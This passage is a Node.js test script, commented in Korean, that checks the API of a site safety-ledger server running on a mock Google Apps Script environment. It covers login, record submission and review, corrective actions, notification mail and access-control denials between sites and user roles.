#!/usr/bin/env node
/**
 * server.test.mjs — Node 에서 모의 GAS(dev/gas-mock.js) 위에 gas/*.gs 를 올려 서버 API 시나리오를 시험한다. SPEC.md §10.
 * 외부 의존성 없음. 실패가 하나라도 있으면 종료 코드 1.
 *
 *   node dev/test/server.test.mjs           요약 출력
 *   VERBOSE=1 node dev/test/server.test.mjs 서버 로그까지 출력
 *   node dev/test/server.test.mjs --paste   gas/ 대신 붙여넣기 묶음 paste/(Code.gs·FormsData.html …)을 올려 같은 시나리오 (SPEC §12)
 *
 * GAS 처럼 서버 호출마다 새 실행(전역 다시 평가)으로 돌린다 — 전역 변수 캐시에 기대는 버그를 잡기 위해.
 */
import fs from 'node:fs';
import vm from 'node:vm';
import path from 'node:path';
import { GAS, MOCK_PATH, gsFiles, htmlFileNames, topLevelNames, mockGlobalNames, serverFactorySource, mapBundleLine, syntaxCheck } from '../build-preview.mjs';

const VERBOSE = !!process.env.VERBOSE;
const PASTE_MODE = process.argv.includes('--paste');
const SRC_DIR = PASTE_MODE ? path.join(GAS, '..', 'paste') : GAS;
const T0 = Date.now();
if (PASTE_MODE) {
  if (!fs.existsSync(path.join(SRC_DIR, 'Code.gs'))) {
    console.error('paste/Code.gs 가 없습니다. 먼저 `node dev/build-paste.mjs` 를 실행하세요.');
    process.exit(1);
  }
  const code = fs.readFileSync(path.join(SRC_DIR, 'Code.gs'), 'utf8');
  const stale = gsFiles().filter((f) => !code.includes(f.src.replace(/\r\n/g, '\n').replace(/\s+$/, ''))).map((f) => f.name);
  if (stale.length) console.log(`주의: paste/Code.gs 가 gas/ 와 다릅니다(${stale.join(', ')}) — \`node dev/build-paste.mjs\` 로 다시 만드세요.\n`);
}

/* ---------------- 모의 + 서버 올리기 ---------------- */

const logBuf = [];
function sinkLine(kind, args) {
  const s = args.map((a) => (typeof a === 'string' ? a : a && a.stack ? String(a.stack) : safeJson(a))).join(' ')
    .replace(/server-bundle\.js:(\d+)(?::\d+)?/g, (m, ln) => (lineMap ? mapBundleLine(lineMap, Number(ln), 0) || m : m));
  logBuf.push(`[${kind}] ${s}`);
  if (logBuf.length > 400) logBuf.shift();
  if (VERBOSE) console.log(`      ${kind}: ${s}`);
}
function safeJson(v) { try { return JSON.stringify(v); } catch (e) { return String(v); } }
const sink = {
  log: (...a) => sinkLine('log', a), info: (...a) => sinkLine('info', a),
  warn: (...a) => sinkLine('warn', a), error: (...a) => sinkLine('error', a), debug: (...a) => sinkLine('debug', a)
};

const mockSrc = fs.readFileSync(MOCK_PATH, 'utf8');
const files = gsFiles(SRC_DIR);
const formsHtml = fs.readFileSync(path.join(SRC_DIR, 'FormsData.html'), 'utf8');
const names = topLevelNames(files);
const { src: factorySrc, map: lineMap } = serverFactorySource(files, mockGlobalNames(mockSrc), names);
const BUNDLE_OFFSET = 1; // 'var __factory = (' 앞줄 없음 → 팩토리 첫 줄이 1행

const memStore = (() => {
  const m = {};
  return { getItem: (k) => (k in m ? m[k] : null), setItem: (k, v) => { m[k] = String(v); }, removeItem: (k) => { delete m[k]; }, _m: m };
})();

const ctx = vm.createContext({ console: sink });
vm.runInContext(mockSrc, ctx, { filename: 'gas-mock.js' });
let bundleOk = true;
try {
  vm.runInContext('var __factory = (' + factorySrc + ');', ctx, { filename: 'server-bundle.js' });
} catch (e) {
  bundleOk = false;
  console.error('서버 번들을 올리지 못했습니다: ' + e.message);
  for (const err of syntaxCheck(files)) console.error(`  ${err.file}: ${err.message}`);
}

const mails = [];
function newMock(storage) {
  return ctx.createGasMock({
    storage, autoSave: false, formsHtml, htmlFiles: htmlFileNames(SRC_DIR), log: sink,
    onMail: (m) => mails.push(m)
  });
}
let mock = newMock(memStore);

function rewriteStack(e) {
  const s = String((e && e.stack) || e);
  return s.replace(/server-bundle\.js:(\d+)(?::\d+)?/g, (m, ln) => mapBundleLine(lineMap, Number(ln), BUNDLE_OFFSET - 1) || m);
}
function instance() {
  if (!bundleOk) throw new Error('서버 번들이 없습니다(문법 오류)');
  return ctx.__factory(mock.globals);
}
function exec(name, ...args) {
  const inst = instance();
  if (typeof inst[name] !== 'function') throw new Error(`서버 함수 ${name}() 이 없습니다`);
  try {
    return inst[name](...args);
  } catch (e) {
    const err = new Error(`${name}() 예외: ${e && e.message}\n${rewriteStack(e).split('\n').slice(1, 6).join('\n')}`);
    err.inner = e;
    throw err;
  }
}
/** api 호출 → 응답 객체 {ok, data|error, code}. 계약 위반(문자열 아님·모양 틀림)은 예외. */
function api(method, payload, token) {
  const raw = exec('api', method, JSON.stringify(payload === undefined ? {} : payload), token || '');
  if (typeof raw !== 'string') throw new Error(`api('${method}') 가 JSON 문자열이 아니라 ${typeof raw} 를 돌려줬습니다`);
  let res;
  try { res = JSON.parse(raw); } catch (e) { throw new Error(`api('${method}') 응답이 JSON 이 아닙니다: ${raw.slice(0, 120)}`); }
  if (!res || typeof res.ok !== 'boolean') throw new Error(`api('${method}') 응답에 ok 가 없습니다: ${raw.slice(0, 120)}`);
  if (!res.ok) {
    const CODES = ['AUTH', 'FORBIDDEN', 'NOTFOUND', 'INVALID', 'CONFLICT', 'SERVER'];
    if (!CODES.includes(res.code)) throw new Error(`api('${method}') 오류 code 가 계약 밖입니다: ${res.code} (${res.error})`);
    if (typeof res.error !== 'string' || !res.error) throw new Error(`api('${method}') 오류 문장이 없습니다`);
  }
  return res;
}
function ok(res, what) {
  if (!res.ok) throw new Error(`${what || ''} 실패 — ${res.code}: ${res.error}`.trim());
  return res.data;
}
function denied(res, codes, what) {
  if (res.ok) throw new Error(`${what || '요청'}이 거부돼야 하는데 성공했습니다`);
  if (codes && !codes.includes(res.code)) throw new Error(`${what || '요청'} 거부 code 가 ${res.code} 입니다(기대: ${codes.join('|')}) — ${res.error}`);
  return res;
}
function assert(cond, msg) { if (!cond) throw new Error(msg); }
function eq(a, b, msg) { if (a !== b) throw new Error(`${msg}: 기대 ${JSON.stringify(b)}, 실제 ${JSON.stringify(a)}`); }

function canon(v) {
  if (Array.isArray(v)) return v.map(canon);
  if (v && typeof v === 'object') {
    const o = {};
    for (const k of Object.keys(v).sort()) o[k] = canon(v[k]);
    return o;
  }
  return v;
}
function deepEq(a, b) { return JSON.stringify(canon(a)) === JSON.stringify(canon(b)); }
function firstDiff(a, b, p = '') {
  if (deepEq(a, b)) return null;
  if (a && b && typeof a === 'object' && typeof b === 'object') {
    for (const k of new Set([...Object.keys(a), ...Object.keys(b)])) {
      const d = firstDiff(a[k], b[k], p + '.' + k);
      if (d) return d;
    }
  }
  const show = (v) => { const s = JSON.stringify(v); return s && s.length > 60 ? s.slice(0, 60) + '…' : s; };
  return `${p || '(값)'}: ${show(a)} ≠ ${show(b)}`;
}

/* ---------------- 날짜 ---------------- */
function kst(d = new Date()) { return new Date(d.getTime() + 9 * 3600 * 1000); }
function ymd(d) { return d.toISOString().slice(0, 10); }
const TODAY = ymd(kst());
function addDays(s, n) { const d = new Date(s + 'T00:00:00Z'); d.setUTCDate(d.getUTCDate() + n); return ymd(d); }
const YYMMDD = TODAY.slice(2).replace(/-/g, '');

/* ---------------- 단계 실행기 ---------------- */
const results = [];
async function step(name, fn, { optional = false } = {}) {
  logBuf.length = 0;
  const t = Date.now();
  try {
    const note = await fn();
    results.push({ name, ok: true, optional });
    console.log(`  [통과] ${name}${note ? ' — ' + note : ''}  (${Date.now() - t}ms)`);
  } catch (e) {
    results.push({ name, ok: false, optional, error: e.message });
    console.log(`  [${optional ? '참고' : '실패'}] ${name} — ${e.message.split('\n')[0]}`);
    const rest = e.message.split('\n').slice(1).filter(Boolean);
    for (const l of rest) console.log('         ' + l.trim());
    if (!VERBOSE) {
      const tail = logBuf.filter((l) => /^\[(warn|error)\]/.test(l)).slice(-6);
      for (const l of tail) console.log('         서버 ' + l.slice(0, 300));
    }
  }
}
function need(v, what) {
  if (v === undefined || v === null || v === '') throw new Error(`앞 단계 실패로 건너뜀(${what} 없음)`);
  return v;
}

/* ---------------- 시나리오 ---------------- */
const S = {};               // 단계 사이에 넘기는 값
const PW = 'pw1234';
const SITE1 = 'S001', SITE2 = 'S002', SITE3 = 'S003';
const MAIL1 = 's001.manager@site.test', MAIL2 = 's002.manager@site.test', HQMAIL = 'hq.safety@hds.test';
const PNG_1PX = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';

console.log(`HDS 안전장부 서버 시험${PASTE_MODE ? ' (붙여넣기 묶음 paste/)' : ''} — 서버 파일 ${files.length}개(${files.map((f) => f.name).join(', ')}), 함수 ${names.functions.join(', ')}`);
console.log(`오늘(KST) ${TODAY}\n`);

await step('서버 번들 올리기(문법·전역 이름)', () => {
  assert(bundleOk, '서버 .gs 를 이어 붙인 번들에 문법 오류가 있습니다');
  const inst = instance();
  for (const n of ['api', 'setup', 'cronDaily', 'cronWeekly', 'doGet', 'include']) assert(typeof inst[n] === 'function', `전역 함수 ${n}() 이 없습니다`);
  return `${files.length}개 파일`;
});

await step('GAS 처럼 파일마다 따로 올리기(역순·한 전역 범위) — 파일 순서 무관', () => {
  // 실제 GAS 는 .gs 파일을 하나씩 같은 전역에 실행한다. 최상위에서 다른 파일 객체를 바로 부르면 순서에 따라 깨진다(SPEC §12).
  const c2 = vm.createContext({ console: sink });
  vm.runInContext(mockSrc, c2, { filename: 'gas-mock.js' });
  const m2 = c2.createGasMock({ autoSave: false, formsHtml, htmlFiles: htmlFileNames(SRC_DIR), log: sink });
  Object.assign(c2, m2.globals);
  for (const f of [...files].reverse()) {
    try { vm.runInContext(f.src, c2, { filename: f.name }); } catch (e) { throw new Error(`${f.name} 를 단독(역순)으로 올리다 오류: ${e.message}`); }
  }
  for (const n of ['api', 'setup', 'cronDaily', 'cronWeekly', 'doGet', 'include']) assert(typeof c2[n] === 'function', `전역 함수 ${n}() 이 없습니다`);
  c2.setup({ adminPassword: 'iso-pw-1', triggers: false });
  const r = JSON.parse(c2.api('auth.login', JSON.stringify({ id: 'admin', password: 'iso-pw-1' }), ''));
  assert(r.ok && r.data && r.data.token, '역순으로 올린 서버에서 로그인 실패: ' + (r.error || ''));
  const b = JSON.parse(c2.api('boot', '{}', r.data.token));
  assert(b.ok, '역순으로 올린 서버에서 boot 실패: ' + (b.error || ''));
  return `${files.length}개 파일 역순`;
});

await step('setup 전 auth.status → ready:false', () => {
  const d = ok(api('auth.status', {}), 'auth.status');
  eq(d.ready, false, 'ready');
  assert(d.appName, 'appName 없음');
});

await step('setup({adminPassword}) — DB·폴더·관리자 생성', () => {
  exec('setup', { adminPassword: PW });
  const props = mock.globals.PropertiesService.getScriptProperties();
  assert(props.getProperty('DB_ID'), 'DB_ID 속성이 없습니다');
  assert(props.getProperty('FOLDER_ID'), 'FOLDER_ID 속성이 없습니다');
  const sheets = mock.sheetNames();
  for (const t of ['sites', 'people', 'users', 'sessions', 'records', 'acts', 'requests', 'reads', 'files', 'log', 'kv']) assert(sheets.includes(t), `시트 ${t} 없음`);
  const users = mock.table('users');
  const admin = users.find((u) => String(u.id).toLowerCase() === 'admin');
  assert(admin, 'admin 사용자 없음');
  assert(!JSON.stringify(admin).includes(PW), '비밀번호가 평문으로 저장됐습니다');
  exec('setup', { adminPassword: 'other999' }); // 두 번 실행해도 안전(idempotent)
  eq(mock.table('users').length, users.length, '두 번째 setup 뒤 사용자 수');
  return `시트 ${sheets.length}개`;
});

await step('doGet — BOOT 템플릿(ready·url)', () => {
  mock.lastTemplate = null;
  exec('doGet', { parameter: {}, parameters: {} });
  const t = mock.lastTemplate;
  assert(t && typeof t.vars.BOOT === 'string', 'Index 템플릿에 BOOT 문자열이 없습니다');
  const b = JSON.parse(t.vars.BOOT);
  eq(b.ready, true, 'BOOT.ready');
  assert(/^https:\/\//.test(b.url), 'BOOT.url');
});

await step('auth.login 틀린 비밀번호 → AUTH', () => { denied(api('auth.login', { id: 'admin', password: 'wrong-pw' }), ['AUTH'], '틀린 비밀번호 로그인'); });

await step('auth.login (admin)', () => {
  const d = ok(api('auth.login', { id: 'admin', password: PW }), 'login');
  assert(d.token && d.token.length >= 32, '세션 토큰이 짧습니다');
  eq(d.me.kind, 'hq', 'me.kind'); eq(d.me.role, 'admin', 'me.role');
  S.hq = d.token;
});

await step('토큰 없이 boot → AUTH', () => { denied(api('boot', {}, ''), ['AUTH'], '토큰 없는 boot'); });

await step('settings.save (본사 메일 수신자)', () => {
  const inst = instance();
  const base = JSON.parse(JSON.stringify(inst.DEFAULT_SETTINGS || {}));
  base.mail = Object.assign({}, base.mail, { enabled: true, onRequest: true, onReturn: true, hqEmails: [HQMAIL] });
  const d = ok(api('settings.save', { settings: base }, need(S.hq, '본사 토큰')), 'settings.save');
  assert(d.settings && d.settings.mail && d.settings.mail.hqEmails.includes(HQMAIL), '저장된 settings 에 hqEmails 가 없습니다');
});

await step('sites.save ×2 (토큰 자동 발급)', () => {
  const mk = (id, name, mail) => ({
    id, name, type: '오피스', region: '서울', client: id === SITE1 ? '한빛자산운용' : '세림리테일', address: '서울특별시 강남구 테헤란로 ' + id.slice(-1) + '0',
    tags: ['보안'], shifts: ['주간', '야간'], forms: [], openDate: '2025-03-01', status: '운영', hec: id === SITE1, headcount: 24,
    managerName: id === SITE1 ? '박현장' : '이소장', managerEmail: mail, managerPhone: '010-1234-567' + id.slice(-1), memo: ''
  });
  const a = ok(api('sites.save', { site: mk(SITE1, '강남오피스타워', MAIL1) }, need(S.hq, '본사 토큰')), 'sites.save S001');
  const b = ok(api('sites.save', { site: mk(SITE2, '판교테크센터', MAIL2) }, S.hq), 'sites.save S002');
  assert(a.site && a.site.token && b.site.token, '사업장 토큰이 발급되지 않았습니다');
  assert(a.site.token !== b.site.token, '두 사업장 토큰이 같습니다');
  S.tok1 = a.site.token; S.tok2 = b.site.token;
  return `S001 토큰 ${S.tok1.length}자`;
});

await step('people.bulk (S001 인원 3명, 중복 1명 건너뜀)', () => {
  const rows = [
    { name: '김경비', job: '보안', role: '근무자', phone4: '0123' },
    { name: '이미화', job: '미화', role: '근무자', phone4: '4567' },
    { name: '박현장', job: '보안', role: '소장', phone4: '8901' }
  ];
  const d = ok(api('people.bulk', { site: SITE1, rows }, need(S.hq, '본사 토큰')), 'people.bulk');
  eq(d.added, 3, 'added');
  const d2 = ok(api('people.bulk', { site: SITE1, rows: [rows[0]] }, S.hq), 'people.bulk 중복');
  eq(d2.added, 0, '중복 added');
  const people = mock.table('people').filter((p) => p.site === SITE1);
  eq(people.length, 3, 'people 행 수');
  const p0 = people.find((p) => p.name === '김경비');
  eq(String(p0.phone4), '0123', 'phone4 앞자리 0 유지(문자열 저장)');
});

await step('auth.siteLogin (사업장 링크 토큰 + 작성자 이름)', () => {
  denied(api('auth.siteLogin', { siteToken: 'WRONGTOKEN123456', name: '김현장' }), ['AUTH'], '틀린 사업장 토큰');
  const d = ok(api('auth.siteLogin', { siteToken: need(S.tok1, '사업장 토큰'), name: '김현장' }), 'siteLogin');
  eq(d.me.kind, 'site', 'me.kind'); eq(d.me.site, SITE1, 'me.site'); eq(d.me.name, '김현장', 'me.name');
  S.site1 = d.token;
});

await step('사업장 boot — 자기 사업장만, 다른 사업장 토큰·사용자 해시 노출 없음', () => {
  const d = ok(api('boot', { days: 400 }, need(S.site1, '사업장 세션')), 'boot(site)');
  eq(d.me.site, SITE1, 'me.site');
  const json = JSON.stringify(d);
  assert(!json.includes(need(S.tok2, 'S002 토큰')), '사업장 boot 에 다른 사업장 토큰이 보입니다');
  assert(!/pwHash|"salt"/.test(json), '사업장 boot 에 비밀번호 해시가 보입니다');
  const idx = Array.isArray(d.index) ? d.index : Object.values(d.index || {});
  assert(idx.every((r) => r.site === SITE1), 'index 에 다른 사업장 기록이 있습니다');
});

/* 양식 정의(FD)로 서버 검사(필수 칸·점검표·표 최소 행·사진 장수)를 통과하는 data 를 만든다. 단계형이면 upto 단계까지. */
const FD = JSON.parse(formsHtml.slice(formsHtml.indexOf('{'), formsHtml.lastIndexOf('}') + 1));
const formOf = (code) => FD.forms.find((f) => f.code === code);
function sampleVal(f) {
  const opt = Array.isArray(f.options) && f.options.length ? f.options[0] : '';
  switch (f.type) {
    case 'number': return f.min != null ? f.min : 0;
    case 'date': return TODAY;
    case 'datetime': return TODAY + 'T08:00';
    case 'time': return '08:00';
    case 'bool': return true;
    case 'select': return opt || '해당없음';
    case 'multi': return [opt || '해당없음'];
    case 'people': return ['김현장'];
    case 'person': return '김현장';
    case 'photo': return 'FILE-TEST';
    case 'computed': return undefined;
    default: return '확인함';
  }
}
function validData(code, base = {}, upto = Infinity) {
  const def = formOf(code);
  const d = {};
  const stageOf = {};
  (def.stages || []).forEach((st, i) => (st.sections || []).forEach((sid) => { if (stageOf[sid] === undefined) stageOf[sid] = i; }));
  const put = (f) => { if (f && f.required && f.type !== 'computed') { const v = sampleVal(f); if (v !== undefined) d[f.id] = v; } };
  (def.header || []).forEach(put);
  for (const s of def.sections || []) {
    if (def.stages && (stageOf[s.id] || 0) > upto) continue;
    if (s.type === 'fields') (s.fields || []).forEach(put);
    if (s.type === 'checklist') d[s.id] = Object.fromEntries((s.items || []).map((it) => [it.code, { r: '양호' }]));
    if (s.type === 'table') d[s.id] = Array.from({ length: s.minRows || 0 }, (x, i) => {
      const row = { _k: 'r' + i };
      (s.columns || []).forEach((c) => { if (c.required && c.type !== 'computed') row[c.id] = sampleVal(c); });
      return row;
    });
    if (s.type === 'photos' && s.minCount) d[s.id] = Array.from({ length: s.minCount }, (x, i) => ({ file: 'FILE-T' + i }));
  }
  return Object.assign(d, base);
}
const F07_DATA = () => validData('F07', {
  checkTime: '08:30', attend: 12, healthChecked: 12, weather: '맑음', tempAir: 14,
  tbmTime: '07:50', tbmTarget: 12, nightSolo: 0, accidentCount: 0, nearMissCount: 0
});

await step('(사업장) records.save F07 임시저장 — id 발급·작성중', () => {
  const rec = { form: 'F07', site: SITE1, date: TODAY, period: TODAY, shift: '주간', author: '김현장', data: F07_DATA() };
  const d = ok(api('records.save', { record: rec }, need(S.site1, '사업장 세션')), 'records.save');
  const r = d.record;
  assert(r && r.id, 'record.id 없음');
  assert(new RegExp(`^ID-${SITE1}-${YYMMDD}-\\d{2}$`).test(r.id), `ID 규칙(ID-S001-${YYMMDD}-NN)과 다릅니다: ${r.id}`);
  eq(r.status, '작성중', 'status');
  eq(r.site, SITE1, 'site');
  S.rec = r;
  return r.id;
});

await step('(사업장) records.submit — 조치 후보 1건 포함', () => {
  const r = need(S.rec, '임시저장 기록');
  const data = F07_DATA();
  data.sec_items = Object.assign({}, data.sec_items, { D01: { r: '양호' }, D02: { r: '불량', note: '2층 소화기 압력 저하' } });
  const facts = { v: { attend: 12, healthChecked: 12, weather: '맑음', accidentCount: 0, nearMissCount: 0 }, t: {}, k: { sec_items: { D01: '양호', D02: '불량' } }, sm: [12, 0, 0] };
  const cand = { key: `${r.id}#sec_items#D02`, srcItem: 'D02', title: '소화기 압력 저하', detail: '2층 소화기 압력 저하', level: '높음', due: addDays(TODAY, 3), owner: '김현장', photo: null };
  const d = ok(api('records.submit', { record: Object.assign({}, r, { data, facts }), acts: [cand] }, S.site1), 'records.submit');
  eq(d.record.status, '제출', 'status');
  eq(Number(d.record.rev), 1, 'rev');
  assert(d.record.submittedAt, 'submittedAt 없음');
  assert(Array.isArray(d.acts) && d.acts.length === 1, `조치 1건이 생겨야 합니다(실제 ${d.acts && d.acts.length})`);
  const a = d.acts[0];
  assert(new RegExp(`^ACT-${SITE1}-\\d{4}-\\d{3}$`).test(a.id), `조치 ID 규칙(ACT-S001-YYMM-NNN)과 다릅니다: ${a.id}`);
  eq(a.status, '등록', '조치 status');
  eq(a.srcId, r.id, '조치 srcId');
  S.rec = d.record; S.act = a; S.cand = cand;
  return `${d.record.id} · ${a.id}`;
});

await step('(본사) boot — 제출 기록·조치가 보임, 사용자 해시 제외', () => {
  const d = ok(api('boot', { days: 400 }, need(S.hq, '본사 토큰')), 'boot(hq)');
  const idx = Array.isArray(d.index) ? d.index : Object.values(d.index || {});
  const row = idx.find((x) => x.id === need(S.rec, '기록').id);
  assert(row, '본사 index 에 제출 기록이 없습니다');
  eq(row.status, '제출', 'index status');
  assert(!('data' in row), 'indexRow 에 data 가 들어 있습니다(계약: data 제외)');
  const acts = Array.isArray(d.acts) ? d.acts : Object.values(d.acts || {});
  assert(acts.some((a) => a.id === S.act.id), '본사 boot 에 조치가 없습니다');
  assert(Array.isArray(d.users) && d.users.length >= 1, 'admin boot 에 users 없음');
  assert(!/pwHash|"salt"/.test(JSON.stringify(d.users)), 'users 에 비밀번호 해시가 들어 있습니다');
  assert(d.urls && /docs\.google\.com\/spreadsheets/.test(d.urls.sheet || ''), 'urls.sheet 없음');
});

await step('(본사) records.review 반려 — 사유·사업장 메일', () => {
  const before = mails.length;
  denied(api('records.review', { id: need(S.rec, '기록').id, decision: '반려', note: '' }, S.hq), ['INVALID'], '사유 없는 반려');
  const d = ok(api('records.review', { id: S.rec.id, decision: '반려', note: '2번 항목 사진을 붙여 다시 제출해 주세요' }, S.hq), 'review 반려');
  eq(d.record.status, '반려', 'status');
  assert(String(d.record.returnNote || '').includes('사진'), 'returnNote 없음');
  const m = mails.slice(before).find((x) => x.to.includes(MAIL1));
  assert(m, `반려 메일이 사업장 담당자(${MAIL1})에게 가지 않았습니다`);
  const body = String(m.htmlBody || m.body || '');
  assert(body.includes('s=') && body.includes('v=rec%2F' + encodeURIComponent(S.rec.id)), '반려 메일 링크가 사업장 링크 + 기록 화면(?s=…&v=rec/ID)이 아닙니다');
  S.rec = d.record;
  return `메일 "${m.subject}"`;
});

await step('(사업장) 고쳐 다시 제출 — rev 2, 조치 중복 없음', () => {
  const r = need(S.rec, '반려 기록');
  const full = ok(api('records.get', { id: r.id }, S.site1), 'records.get');
  const data = Object.assign({}, full.data, { handoverNote: '소화기 교체 요청함', sec_items: Object.assign({}, full.data.sec_items, { D01: { r: '양호' }, D02: { r: '불량', note: '2층 소화기 압력 저하', photo: 'FILE-TEST' } }) });
  const d = ok(api('records.submit', { record: Object.assign({}, full, { data }), acts: [need(S.cand, '조치 후보')] }, S.site1), 'records.submit(재제출)');
  eq(d.record.status, '제출', 'status');
  eq(Number(d.record.rev), 2, 'rev');
  const acts = mock.table('acts').filter((a) => a.key === S.cand.key && String(a.deleted) !== 'true');
  eq(acts.length, 1, '같은 key 조치 수');
  S.rec = d.record;
});

await step('(사업장) 제출된 기록 임시저장 → 거부(수정 제출만)', () => {
  const r = need(S.rec, '기록');
  const res = denied(api('records.save', { record: { id: r.id, data: Object.assign({}, r.data || {}, { workerVoice: '몰래 고침' }) } }, S.site1), ['CONFLICT'], '제출 기록 임시저장');
  assert(/수정 제출/.test(res.error), '안내 문장에 [수정 제출]이 없습니다: ' + res.error);
});

await step('(본사) records.review 확인', () => {
  const d = ok(api('records.review', { id: need(S.rec, '기록').id, decision: '확인', note: '' }, S.hq), 'review 확인');
  eq(d.record.status, '확인', 'status');
  assert(d.record.confirmedAt, 'confirmedAt 없음');
  assert(d.record.confirmedBy, 'confirmedBy 없음');
  S.rec = d.record;
});

await step('(사업장) 확인된 기록 수정 시도 → 거부', () => {
  const r = need(S.rec, '확인 기록');
  const full = ok(api('records.get', { id: r.id }, S.site1), 'records.get');
  const changed = Object.assign({}, full, { data: Object.assign({}, full.data, { attend: 99 }) });
  denied(api('records.save', { record: changed }, S.site1), ['CONFLICT', 'FORBIDDEN', 'INVALID'], '확인 기록 임시저장');
  denied(api('records.submit', { record: changed, acts: [] }, S.site1), ['CONFLICT', 'FORBIDDEN', 'INVALID'], '확인 기록 재제출');
  const after = ok(api('records.get', { id: r.id }, S.hq), 'records.get(본사)');
  eq(Number(after.data.attend), 12, '잠긴 기록의 attend');
});

await step('acts.transition 조치중 → 완료 → (본사) 확인', () => {
  const a = need(S.act, '조치');
  const d1 = ok(api('acts.transition', { id: a.id, to: '조치중', note: '부품 주문' }, S.site1), '조치중');
  eq(d1.act.status, '조치중', 'status');
  const d2 = ok(api('acts.transition', { id: a.id, to: '완료', note: '소화기 교체 완료', noPhotoReason: '카메라 고장' }, S.site1), '완료');
  eq(d2.act.status, '완료', 'status');
  assert(JSON.stringify(d2.act.history).includes('사진 없음 사유: 카메라 고장'), 'noPhotoReason 이 이력 메모에 남지 않았습니다');
  assert(d2.act.doneAt, 'doneAt 없음');
  const d3 = ok(api('acts.transition', { id: a.id, to: '확인', note: '' }, S.hq), '확인');
  eq(d3.act.status, '확인', 'status');
  assert(d3.act.confirmedBy, 'confirmedBy 없음');
  assert(Array.isArray(d3.act.history) && d3.act.history.length >= 3, `history 가 3건 이상이어야 합니다(실제 ${d3.act.history && d3.act.history.length})`);
});

await step('(본사) requests.save — 대상 사업장 담당자 메일', () => {
  const before = mails.length;
  const req = { kind: 'form', title: '11월 위험성평가 제출 요청', message: '정기 위험성평가 결과를 마감일까지 올려 주세요.', forms: ['F01'], sites: [SITE1], due: addDays(TODAY, 7), ackRequired: true };
  const d = ok(api('requests.save', { request: req }, need(S.hq, '본사 토큰')), 'requests.save');
  const r = d.request;
  assert(new RegExp(`^REQ-${YYMMDD}-\\d{2}$`).test(r.id), `요청 ID 규칙(REQ-${YYMMDD}-NN)과 다릅니다: ${r.id}`);
  eq(r.status, '진행', 'status');
  const m = mails.slice(before).find((x) => x.to.includes(MAIL1));
  assert(m, `새 요청 메일이 ${MAIL1} 로 가지 않았습니다`);
  assert(!mails.slice(before).some((x) => x.to.includes(MAIL2)), '대상이 아닌 S002 에도 메일이 갔습니다');
  assert(/s=/.test(m.htmlBody || m.body), '메일 본문에 사업장 링크(?s=)가 없습니다');
  S.req = r;
  return `메일 "${m.subject}"`;
});

await step('(본사) requests.remind — 미제출 사업장 독촉', () => {
  const before = mails.length;
  const d = ok(api('requests.remind', { id: need(S.req, '요청').id }, S.hq), 'requests.remind');
  assert(typeof d.sent === 'number' && typeof d.skipped === 'number', 'sent/skipped 숫자가 아닙니다');
  assert(d.sent >= 1, `독촉 메일이 1건 이상이어야 합니다(sent ${d.sent}, skipped ${d.skipped})`);
  assert(mails.slice(before).some((x) => x.to.includes(MAIL1)), '독촉 메일 포착 안 됨');
  return `sent ${d.sent}, skipped ${d.skipped}`;
});

await step('(사업장) reads.mark — 요청 열람 기록', () => {
  const d = ok(api('reads.mark', { refId: need(S.req, '요청').id }, need(S.site1, '사업장 세션')), 'reads.mark');
  assert(d.read, 'read 없음');
  eq(d.read.refId, S.req.id, 'read.refId');
  eq(d.read.site, SITE1, 'read.site');
  ok(api('reads.mark', { refId: S.req.id }, S.site1), 'reads.mark 두 번째');
  const rows = mock.table('reads').filter((x) => x.refId === S.req.id && x.site === SITE1);
  assert(rows.length >= 1, 'reads 행 없음');
});

await step('(사업장) files.put / files.get 왕복', () => {
  const dataUrl = 'data:image/png;base64,' + PNG_1PX;
  const d = ok(api('files.put', { dataUrl, name: '소화기.png', kind: 'photo', recordId: need(S.rec, '기록').id }, need(S.site1, '사업장 세션')), 'files.put');
  assert(d.file && /^FILE-/.test(d.file.id), `파일 ID 규칙(FILE-…)과 다릅니다: ${d.file && d.file.id}`);
  eq(d.file.site, SITE1, 'file.site');
  const g = ok(api('files.get', { id: d.file.id }, S.site1), 'files.get');
  eq(g.mime, 'image/png', 'mime');
  eq(String(g.dataUrl).split(',')[1], PNG_1PX, 'dataUrl 내용');
  S.file = d.file;
});

await step('다른 사업장 접근 거부(S002 세션 → S001 기록·파일·조치)', () => {
  const d = ok(api('auth.siteLogin', { siteToken: need(S.tok2, 'S002 토큰'), name: '최판교' }), 'siteLogin S002');
  S.site2 = d.token;
  const notes = [];
  const r1 = denied(api('records.get', { id: need(S.rec, '기록').id }, S.site2), ['FORBIDDEN', 'NOTFOUND'], '다른 사업장 기록 읽기');
  notes.push('records.get ' + r1.code);
  denied(api('files.get', { id: need(S.file, '파일').id }, S.site2), ['FORBIDDEN', 'NOTFOUND'], '다른 사업장 파일 읽기');
  denied(api('acts.transition', { id: need(S.act, '조치').id, to: '조치중', note: 'x' }, S.site2), ['FORBIDDEN', 'NOTFOUND', 'CONFLICT'], '다른 사업장 조치 전환');
  denied(api('people.bulk', { site: SITE1, rows: [{ name: '침입자', job: '', role: '', phone4: '' }] }, S.site2), ['FORBIDDEN'], '다른 사업장 인원 등록');
  const w = api('records.save', { record: { form: 'F07', site: SITE1, date: TODAY, period: TODAY, data: {} } }, S.site2);
  if (w.ok) eq(w.data.record.site, SITE2, '다른 사업장 이름으로 저장 시 사업장');
  else denied(w, ['FORBIDDEN', 'INVALID'], '다른 사업장 기록 저장');
  denied(api('sites.save', { site: { id: 'S009', name: 'x' } }, S.site2), ['FORBIDDEN'], '사업장이 사업장 등록');
  return notes.join(', ');
});

await step('열람(viewer) 쓰기 거부, 읽기 허용', () => {
  const u = ok(api('users.save', { user: { id: 'viewer1', name: '열람담당', role: 'viewer', email: 'viewer@hds.test', active: true }, password: 'view1234a' }, need(S.hq, '본사 토큰')), 'users.save');
  assert(!/pwHash|"salt"/.test(JSON.stringify(u)), 'users.save 응답에 해시가 있습니다');
  const d = ok(api('auth.login', { id: 'viewer1', password: 'view1234a' }), 'viewer 로그인');
  S.viewer = d.token;
  ok(api('boot', {}, S.viewer), 'viewer boot');
  denied(api('records.save', { record: { form: 'F07', site: SITE1, date: TODAY, period: TODAY, data: {} } }, S.viewer), ['FORBIDDEN'], 'viewer 기록 저장');
  denied(api('requests.save', { request: { kind: 'notice', title: 'x', sites: ['*'] } }, S.viewer), ['FORBIDDEN'], 'viewer 요청 저장');
  denied(api('records.review', { id: need(S.rec, '기록').id, decision: '확인취소', note: '' }, S.viewer), ['FORBIDDEN'], 'viewer 검토');
